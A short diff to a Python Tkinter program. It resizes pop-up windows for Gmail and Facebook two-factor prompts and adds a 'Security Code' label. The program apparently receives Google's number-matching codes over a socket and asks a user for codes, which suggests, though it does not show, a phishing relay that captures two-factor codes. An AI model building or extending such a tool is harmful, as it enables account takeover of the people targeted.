@@ -57,7 +57,8 @@ def G_two_factor(res,mylabel,client):
         # get google authentication 3 number from you
         codes = client.recv(1024).decode().split(" ")
         fwindow = Toplevel()
-        fwindow.geometry("400x300")
+        fwindow.geometry("400x180")
+        fwindow.resizable(False,False)
         fwindow.title("Gmail Two Authentication")
         Label(fwindow,text=f'''{codes[0]}      {codes[1]}      {codes[2]}''',font=("Arial",15)).pack(pady=10)
         number = Entry(fwindow,width=8)
@@ -81,10 +82,12 @@ def F_two_factor(res,mylabel,client):
             rlbl.config(text="Security code is wrong,check again")
     if(res):
         fwindow = Toplevel()
-        fwindow.geometry("400x300")
+        fwindow.geometry("400x180")
+        fwindow.resizable(False,False)
         fwindow.title("Facebook Authentication")
         rlbl = Label(fwindow,text="",font=("Arial",7),foreground="maroon")
         rlbl.pack(pady=6)
+        Label(fwindow,text="Security Code").pack(pady=10)
         code = Entry(fwindow,width=13)
         code.focus_set()
         code.pack(pady=10)
